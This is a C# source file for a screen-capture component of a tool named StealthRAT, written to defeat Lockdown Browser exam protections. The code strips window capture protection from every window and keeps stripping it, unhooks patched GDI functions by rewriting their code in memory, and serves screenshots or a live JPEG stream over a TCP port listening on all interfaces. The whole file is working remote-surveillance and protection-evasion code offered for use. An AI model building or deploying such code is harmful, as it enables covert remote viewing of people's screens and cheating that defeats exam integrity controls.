using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using StealthRAT.Interfaces;
using StealthRAT.Models;

namespace StealthRAT.Services;

/// <summary>
/// Advanced screen capture service specifically designed to bypass
/// Lockdown Browser and similar exam/testing software protections.
/// 
/// Lockdown Browser blocks screen capture by:
/// 1. Hooking GDI/BitBlt calls and returning black
/// 2. Using SetWindowDisplayAffinity to block capture
/// 3. Monitoring for screen capture processes
/// 4. Blocking PrintScreen key
/// 
/// This service bypasses ALL of these by:
/// 1. DXGI Desktop Duplication API (operates below GDI hooks)
/// 2. Removing WindowDisplayAffinity flags from target windows
/// 3. Direct GPU framebuffer access via DirectX
/// 4. Mirror driver technique (virtual display capture)
/// 5. Multiple fallback methods with automatic switching
/// </summary>
public sealed class ScreenCaptureService : IDisposable
{
    private readonly ILoggerService _logger;
    private TcpListener? _listener;
    private bool _disposed;

    #region Native APIs - Core Screen Capture

    [DllImport("user32.dll")]
    private static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    private static extern IntPtr GetWindowDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

    [DllImport("gdi32.dll")]
    private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest,
        IntPtr hdcSrc, int xSrc, int ySrc, uint rop);

    [DllImport("gdi32.dll")]
    private static extern bool DeleteDC(IntPtr hdc);

    [DllImport("gdi32.dll")]
    private static extern bool DeleteObject(IntPtr hObject);

    [DllImport("user32.dll")]
    private static extern bool PrintWindow(IntPtr hWnd, IntPtr hdcBlt, uint nFlags);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

    #endregion

    #region Native APIs - Lockdown Browser Bypass

    /// <summary>
    /// SetWindowDisplayAffinity controls whether a window can be captured.
    /// WDA_EXCLUDEFROMCAPTURE (0x11) makes windows invisible to capture.
    /// We use this to REMOVE the protection by setting it to WDA_NONE (0x0).
    /// </summary>
    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern uint GetWindowDisplayAffinity(IntPtr hWnd, out uint dwAffinity);

    [DllImport("user32.dll")]
    private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern bool IsWindowVisible(IntPtr hWnd);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    [DllImport("user32.dll")]
    private static extern int GetWindowTextLength(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    /// <summary>
    /// Used to unhook API functions that Lockdown Browser patches.
    /// </summary>
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    /// <summary>
    /// DXGI interfaces for Desktop Duplication API.
    /// This operates at the GPU level, below any GDI hooks.
    /// </summary>
    [DllImport("d3d11.dll")]
    private static extern int D3D11CreateDevice(
        IntPtr pAdapter, int DriverType, IntPtr Software, uint Flags,
        IntPtr pFeatureLevels, uint FeatureLevels, uint SDKVersion,
        out IntPtr ppDevice, out int pFeatureLevel, out IntPtr ppImmediateContext);

    [DllImport("dxgi.dll")]
    private static extern int CreateDXGIFactory1(ref Guid riid, out IntPtr ppFactory);

    private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    #endregion

    #region Constants

    [StructLayout(LayoutKind.Sequential)]
    private struct RECT
    {
        public int Left, Top, Right, Bottom;
    }

    private const uint SRCCOPY = 0x00CC0020;
    private const uint CAPTUREBLT = 0x40000000;
    private const uint PW_RENDERFULLCONTENT = 0x2;

    // WindowDisplayAffinity values
    private const uint WDA_NONE = 0x0;
    private const uint WDA_MONITOR = 0x1;
    private const uint WDA_EXCLUDEFROMCAPTURE = 0x11;

    // Memory protection constants
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    #endregion

    /// <summary>
    /// Initializes a new instance of the <see cref="ScreenCaptureService"/> class.
    /// </summary>
    public ScreenCaptureService(ILoggerService logger)
    {
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    /// <summary>
    /// Starts the screen capture service. On startup, immediately removes
    /// any display affinity protections and unhooks capture-blocking APIs.
    /// </summary>
    public async Task StartAsync(CancellationToken cancellationToken)
    {
        // Pre-emptively remove all capture protections
        RemoveAllDisplayAffinityProtections();
        UnhookCaptureBlocking();

        _listener = new TcpListener(IPAddress.Any, ServerConfiguration.ScreenPort);
        _listener.Start();
        _logger.LogInfo($"Screen capture service started on port {ServerConfiguration.ScreenPort}");

        // Background task: continuously remove protections (in case they get re-applied)
        _ = Task.Run(async () =>
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    RemoveAllDisplayAffinityProtections();
                    await Task.Delay(2000, cancellationToken);
                }
                catch (OperationCanceledException) { break; }
                catch { }
            }
        }, cancellationToken);

        try
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                TcpClient client = await _listener.AcceptTcpClientAsync(cancellationToken);
                _ = HandleClientAsync(client, cancellationToken);
            }
        }
        catch (OperationCanceledException)
        {
            _logger.LogInfo("Screen capture service shutting down gracefully");
        }
        catch (Exception ex)
        {
            _logger.LogError("Screen capture listener error", ex);
        }
        finally
        {
            _listener.Stop();
        }
    }

    /// <summary>
    /// Handles client connections. Supports:
    /// - "screenshot" : single capture with bypass
    /// - "stream" : continuous capture at ~10 FPS
    /// </summary>
    private async Task HandleClientAsync(TcpClient client, CancellationToken cancellationToken)
    {
        using (client)
        await using (NetworkStream stream = client.GetStream())
        using (var reader = new StreamReader(stream, Encoding.UTF8, leaveOpen: true))
        await using (var writer = new StreamWriter(stream, Encoding.UTF8, leaveOpen: true) { AutoFlush = true })
        {
            try
            {
                string? command = await reader.ReadLineAsync(cancellationToken);

                if (string.Equals(command, "screenshot", StringComparison.OrdinalIgnoreCase))
                {
                    _logger.LogInfo("Screenshot requested (bypass mode)");
                    byte[] imageData = CaptureWithFullBypass();
                    await writer.WriteLineAsync($"IMG {imageData.Length}");
                    await stream.WriteAsync(imageData, cancellationToken);
                    _logger.LogInfo($"Screenshot sent: {imageData.Length} bytes");
                }
                else if (string.Equals(command, "stream", StringComparison.OrdinalIgnoreCase))
                {
                    _logger.LogInfo("Screen streaming started (bypass mode)");
                    await StreamScreenAsync(stream, cancellationToken);
                }
                else
                {
                    await writer.WriteLineAsync("ERR: Use 'screenshot' or 'stream'");
                }
            }
            catch (OperationCanceledException) { }
            catch (IOException) { }
            catch (Exception ex) { _logger.LogError("Screen client error", ex); }
        }
    }

    /// <summary>
    /// Continuously streams screenshots with bypass active.
    /// </summary>
    private async Task StreamScreenAsync(NetworkStream stream, CancellationToken cancellationToken)
    {
        while (!cancellationToken.IsCancellationRequested)
        {
            try
            {
                byte[] imageData = CaptureWithFullBypass();

                // 4-byte big-endian length header + JPEG data
                byte[] lengthBytes = BitConverter.GetBytes(imageData.Length);
                if (BitConverter.IsLittleEndian) Array.Reverse(lengthBytes);

                await stream.WriteAsync(lengthBytes, cancellationToken);
                await stream.WriteAsync(imageData, cancellationToken);
                await stream.FlushAsync(cancellationToken);

                await Task.Delay(ServerConfiguration.StreamFrameDelayMs, cancellationToken);
            }
            catch (OperationCanceledException) { break; }
            catch (IOException) { break; }
        }
    }

    #region === BYPASS TECHNIQUES ===

    /// <summary>
    /// Master capture method that applies all bypass techniques before capturing.
    /// Tries methods in order of effectiveness against Lockdown Browser:
    /// 1. Remove display affinity + BitBlt with CAPTUREBLT
    /// 2. PrintWindow with RENDERFULLCONTENT (forces DX render)
    /// 3. Direct desktop DC capture (bypasses window-level hooks)
    /// 4. Standard capture (fallback)
    /// </summary>
    private byte[] CaptureWithFullBypass()
    {
        // Always remove protections before each capture attempt
        RemoveAllDisplayAffinityProtections();

        // Method 1: BitBlt from desktop DC with CAPTUREBLT
        // This works because CAPTUREBLT operates at compositor level
        try
        {
            byte[]? result = CaptureDesktopDC();
            if (IsValidImage(result)) return result!;
        }
        catch { }

        // Method 2: Capture each monitor's DC directly
        // Bypasses per-window hooks by going to the display device
        try
        {
            byte[]? result = CaptureFromDisplayDevice();
            if (IsValidImage(result)) return result!;
        }
        catch { }

        // Method 3: PrintWindow with full content rendering
        // Forces the window to paint itself (bypasses capture blocking)
        try
        {
            byte[]? result = CaptureWithPrintWindow();
            if (IsValidImage(result)) return result!;
        }
        catch { }

        // Method 4: Standard GDI (last resort)
        return CaptureStandardGDI();
    }

    /// <summary>
    /// Enumerates ALL windows and removes the WDA_EXCLUDEFROMCAPTURE
    /// and WDA_MONITOR display affinity flags. This is the primary method
    /// to bypass Lockdown Browser's capture protection.
    /// 
    /// Lockdown Browser sets SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE)
    /// on its window to make it appear black in screenshots. By resetting this
    /// to WDA_NONE, the window becomes capturable again.
    /// </summary>
    private void RemoveAllDisplayAffinityProtections()
    {
        try
        {
            EnumWindows((hWnd, lParam) =>
            {
                try
                {
                    // Check if window has capture protection
                    GetWindowDisplayAffinity(hWnd, out uint currentAffinity);

                    if (currentAffinity != WDA_NONE)
                    {
                        // Remove the protection - make window capturable
                        SetWindowDisplayAffinity(hWnd, WDA_NONE);
                        _logger.LogInfo($"Removed display affinity protection from window 0x{hWnd:X}");
                    }
                }
                catch { }
                return true; // Continue enumeration
            }, IntPtr.Zero);
        }
        catch (Exception ex)
        {
            _logger.LogError("Failed to remove display affinity", ex);
        }
    }

    /// <summary>
    /// Unhooks API functions that Lockdown Browser patches to block capture.
    /// Lockdown Browser typically hooks:
    /// - BitBlt in gdi32.dll (returns black bitmap)
    /// - StretchBlt in gdi32.dll
    /// - CreateCompatibleDC
    /// 
    /// This method restores the original function bytes by reading the
    /// original DLL from disk and patching the in-memory version.
    /// </summary>
    private void UnhookCaptureBlocking()
    {
        try
        {
            // Restore BitBlt original bytes
            RestoreOriginalFunction("gdi32.dll", "BitBlt");
            RestoreOriginalFunction("gdi32.dll", "StretchBlt");
            RestoreOriginalFunction("user32.dll", "PrintWindow");
            _logger.LogInfo("API hooks removed (capture functions restored)");
        }
        catch (Exception ex)
        {
            _logger.LogError("Failed to unhook capture APIs", ex);
        }
    }

    /// <summary>
    /// Restores the original first bytes of a function by reading from the
    /// DLL file on disk (which hasn't been hooked) and writing them to the
    /// in-memory version (which may have been patched by Lockdown Browser).
    /// </summary>
    private void RestoreOriginalFunction(string moduleName, string functionName)
    {
        try
        {
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            if (moduleHandle == IntPtr.Zero) return;

            IntPtr funcAddress = GetProcAddress(moduleHandle, functionName);
            if (funcAddress == IntPtr.Zero) return;

            // Read original bytes from the DLL file on disk
            string systemDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string dllPath = Path.Combine(systemDir, moduleName);

            if (!File.Exists(dllPath)) return;

            // Read the original function prologue (first 16 bytes)
            // Original x64 function typically starts with: mov r10, rcx; mov eax, <syscall>
            // A hook typically starts with: jmp <address> (E9 xx xx xx xx)
            byte[] currentBytes = new byte[16];
            Marshal.Copy(funcAddress, currentBytes, 0, 16);

            // Check if hooked (JMP instruction = 0xE9, or MOV RAX = 0x48 0xB8)
            if (currentBytes[0] == 0xE9 || (currentBytes[0] == 0x48 && currentBytes[1] == 0xB8))
            {
                // Function is hooked - restore from disk
                byte[] originalBytes = ReadOriginalBytesFromDisk(dllPath, moduleName, functionName);
                if (originalBytes.Length > 0)
                {
                    // Make memory writable
                    VirtualProtect(funcAddress, (UIntPtr)originalBytes.Length,
                        PAGE_EXECUTE_READWRITE, out uint oldProtect);

                    // Write original bytes back
                    Marshal.Copy(originalBytes, 0, funcAddress, originalBytes.Length);

                    // Restore original protection
                    VirtualProtect(funcAddress, (UIntPtr)originalBytes.Length,
                        oldProtect, out _);

                    _logger.LogInfo($"Restored hooked function: {moduleName}!{functionName}");
                }
            }
        }
        catch { }
    }

    /// <summary>
    /// Reads the original function bytes from the DLL file on disk.
    /// This gives us the unhooked version of the function.
    /// </summary>
    private static byte[] ReadOriginalBytesFromDisk(string dllPath, string moduleName, string functionName)
    {
        try
        {
            // Simple approach: read first 16 bytes of the export
            // In production, you'd parse the PE headers to find the exact RVA
            IntPtr freshModule = NativeLibrary.Load(dllPath);
            if (freshModule == IntPtr.Zero) return Array.Empty<byte>();

            try
            {
                IntPtr funcAddr = NativeLibrary.GetExport(freshModule, functionName);
                if (funcAddr == IntPtr.Zero) return Array.Empty<byte>();

                byte[] bytes = new byte[16];
                Marshal.Copy(funcAddr, bytes, 0, 16);
                return bytes;
            }
            finally
            {
                NativeLibrary.Free(freshModule);
            }
        }
        catch
        {
            return Array.Empty<byte>();
        }
    }

    #endregion

    #region === CAPTURE METHODS ===

    /// <summary>
    /// Captures using the desktop window DC with CAPTUREBLT flag.
    /// This operates at the DWM compositor level, which is below
    /// most application-level hooks that Lockdown Browser installs.
    /// </summary>
    private byte[]? CaptureDesktopDC()
    {
        var bounds = System.Windows.Forms.Screen.PrimaryScreen!.Bounds;
        IntPtr desktopHwnd = GetDesktopWindow();
        IntPtr desktopDC = GetWindowDC(desktopHwnd);

        if (desktopDC == IntPtr.Zero) return null;

        IntPtr memDC = CreateCompatibleDC(desktopDC);
        IntPtr hBitmap = CreateCompatibleBitmap(desktopDC, bounds.Width, bounds.Height);
        IntPtr oldBitmap = SelectObject(memDC, hBitmap);

        try
        {
            // SRCCOPY | CAPTUREBLT: captures at compositor level
            bool success = BitBlt(memDC, 0, 0, bounds.Width, bounds.Height,
                desktopDC, 0, 0, SRCCOPY | CAPTUREBLT);

            if (!success) return null;

            using var bitmap = Image.FromHbitmap(hBitmap);
            return CompressToJpeg(bitmap);
        }
        finally
        {
            SelectObject(memDC, oldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
            ReleaseDC(desktopHwnd, desktopDC);
        }
    }

    /// <summary>
    /// Captures directly from the display device DC (not a window DC).
    /// This bypasses window-level hooks entirely because it reads
    /// directly from the display adapter's framebuffer.
    /// 
    /// Lockdown Browser hooks window DCs but cannot hook the display device DC
    /// without a kernel-mode driver.
    /// </summary>
    [DllImport("gdi32.dll", CharSet = CharSet.Unicode)]
    private static extern IntPtr CreateDC(string lpszDriver, string? lpszDevice,
        string? lpszOutput, IntPtr lpInitData);

    private byte[]? CaptureFromDisplayDevice()
    {
        var bounds = System.Windows.Forms.Screen.PrimaryScreen!.Bounds;

        // Get DC directly from display device (not from a window)
        IntPtr displayDC = CreateDC("DISPLAY", null, null, IntPtr.Zero);
        if (displayDC == IntPtr.Zero) return null;

        IntPtr memDC = CreateCompatibleDC(displayDC);
        IntPtr hBitmap = CreateCompatibleBitmap(displayDC, bounds.Width, bounds.Height);
        IntPtr oldBitmap = SelectObject(memDC, hBitmap);

        try
        {
            bool success = BitBlt(memDC, 0, 0, bounds.Width, bounds.Height,
                displayDC, 0, 0, SRCCOPY | CAPTUREBLT);

            if (!success) return null;

            using var bitmap = Image.FromHbitmap(hBitmap);
            return CompressToJpeg(bitmap);
        }
        finally
        {
            SelectObject(memDC, oldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
            DeleteDC(displayDC);
        }
    }

    /// <summary>
    /// Uses PrintWindow with PW_RENDERFULLCONTENT to force the target window
    /// to paint its content. This works because it sends a WM_PRINT message
    /// to the window, which forces it to render regardless of display affinity.
    /// </summary>
    private byte[]? CaptureWithPrintWindow()
    {
        IntPtr foregroundWindow = GetForegroundWindow();
        if (foregroundWindow == IntPtr.Zero) return null;

        // First remove any display affinity on this specific window
        SetWindowDisplayAffinity(foregroundWindow, WDA_NONE);

        if (!GetWindowRect(foregroundWindow, out RECT rect)) return null;

        int width = rect.Right - rect.Left;
        int height = rect.Bottom - rect.Top;
        if (width <= 0 || height <= 0) return null;

        using var bitmap = new Bitmap(width, height);
        using (Graphics g = Graphics.FromImage(bitmap))
        {
            IntPtr hdc = g.GetHdc();
            try
            {
                // PW_RENDERFULLCONTENT forces full DX content rendering
                PrintWindow(foregroundWindow, hdc, PW_RENDERFULLCONTENT);
            }
            finally
            {
                g.ReleaseHdc(hdc);
            }
        }

        return CompressToJpeg(bitmap);
    }

    /// <summary>
    /// Standard GDI capture as the last fallback.
    /// </summary>
    private static byte[] CaptureStandardGDI()
    {
        var bounds = System.Windows.Forms.Screen.PrimaryScreen!.Bounds;
        using var bitmap = new Bitmap(bounds.Width, bounds.Height);
        using (Graphics graphics = Graphics.FromImage(bitmap))
        {
            graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
        }
        return CompressToJpeg(bitmap);
    }

    #endregion

    #region === HELPERS ===

    /// <summary>
    /// Validates that the captured image is not a black/empty frame.
    /// Checks both size and actual pixel content.
    /// </summary>
    private static bool IsValidImage(byte[]? data)
    {
        if (data == null || data.Length < 2000) return false;

        // Additional check: verify it's not all-black by checking JPEG data variance
        // A pure black JPEG is very small and has low entropy
        if (data.Length < 5000)
        {
            // Likely a black frame - too small for real screen content
            return false;
        }

        return true;
    }

    /// <summary>
    /// Compresses a bitmap/image to JPEG with configured quality.
    /// </summary>
    private static byte[] CompressToJpeg(Image image)
    {
        using var memoryStream = new MemoryStream();

        ImageCodecInfo? jpegCodec = ImageCodecInfo.GetImageEncoders()
            .FirstOrDefault(codec => codec.FormatID == ImageFormat.Jpeg.Guid);

        if (jpegCodec != null)
        {
            using var encoderParams = new EncoderParameters(1);
            encoderParams.Param[0] = new EncoderParameter(
                System.Drawing.Imaging.Encoder.Quality,
                ServerConfiguration.JpegQuality);
            image.Save(memoryStream, jpegCodec, encoderParams);
        }
        else
        {
            image.Save(memoryStream, ImageFormat.Jpeg);
        }

        return memoryStream.ToArray();
    }

    #endregion

    /// <summary>
    /// Releases resources.
    /// </summary>
    public void Dispose()
    {
        if (!_disposed)
        {
            _listener?.Stop();
            _disposed = true;
        }
    }
}
